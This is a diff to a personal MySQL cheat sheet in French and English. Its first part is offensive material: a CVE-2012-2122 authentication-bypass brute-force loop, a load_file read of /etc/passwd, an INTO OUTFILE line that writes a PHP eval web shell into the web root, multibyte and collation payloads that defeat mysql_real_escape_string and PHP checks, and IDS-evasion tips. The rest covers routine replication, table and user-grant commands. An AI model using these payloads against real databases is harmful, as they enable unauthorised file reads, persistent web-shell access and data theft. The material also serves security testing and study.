@@ -5,18 +5,18 @@ https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-
 for i in `seq 1 1000`; do mysql -u root --password=bad -h 127.0.0.1 2>/dev/null; done
 auxiliary/scanner/mysql/mysql_authbypass_hashdump
 
-# SQLi-fu
+# common tricks
 select user(),database(),version(),@@datadir,5
 select load_file('/etc/passwd') or SELECT CAST(load_file( '/etc/apache2/sites-enabled/000-default') AS char) 
 select "<?php eval($_REQUEST['c']); ?>",2,3,4 INTO OUTFILE "/var/www/html/temp/webshell.php" -- # or use eval()
-CONNECTION_ID() # fp
 
 # multibyte to bypass mysql-real-escape-string (db driver and db don't talk same charset) http://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql
 login=%bf%27+or+1=1%23 (?)
-login=%a5%26+or+1=1%23 (shift-js)
+login=%a5%27+or+1=1%23 (shift-js) 0xa5 becomes \ when encoded as shift-jis so it will escape the \ inserted by mysql_real_escape_string: 'where color="%s"' % u'blue\u00a5" or 1#'.encode('shift-jis') -> where color="blue\\" or 1#"
 
-# evasion / leet tips
+# leet tips
 mysql allow chars from 09, 0A-0D, A0 to be used as whitespaces
+mysql utf-8 collation ('Ä' is equal 'a') can bypass php checks: 'orÄnge' will bypass "if ($username === 'orange')"
 select 1,info from information_schema.processlist # afficher la requete SQL
 and 1=1 procedure analyse() # afficher les noms des colonnes du select
 evade IDS with information_schema.{key_column_usage,table_constraints,statistics,partitions}
@@ -74,24 +74,23 @@ select (case when (1=1) then 1 else 1*(select 1 from information_schema.characte
 # Auditing 
 mysqlaudit.py
 
-# recuperer fichier de configuration
+* recuperer fichier de configuration
 le my.cnf réellement utilisé (verifier avec lsof ou ps fauxww)
 
-# si configuration avec replication
-# sur le master
+* si configuration avec replication
+- sur le master
 show master status;
-# sur chaque slave
+- sur chaque slave
 show slave status\G
 
-# verifier que les fichiers log ne sont pas vides
+* verifier que les fichiers log ne sont pas vides
 
 # usage
-# creer une table
+* creer une table
 create table blah (id int(11) not null, libelle varchar(30));
 insert into blah (id, libelle) values (1, 'blah');
 
-# creer/supprimer un utilisateur
-# mieux vaut toujours preciser le host car c'est @'%' par defaut sinon.
+* creer/supprimer un utilisateur (mieux vaut toujours preciser le host car c'est @'%' par defaut sinon)
 GRANT ALL PRIVILEGES ON mabdd.* TO 'monty'@'localhost' identified by 'p@ssw0rd';
 GRANT select,update on mabdd.* TO 'monty'@'localhost' identified by 'some_password';
 DROP USER 'monty'@'localhost';
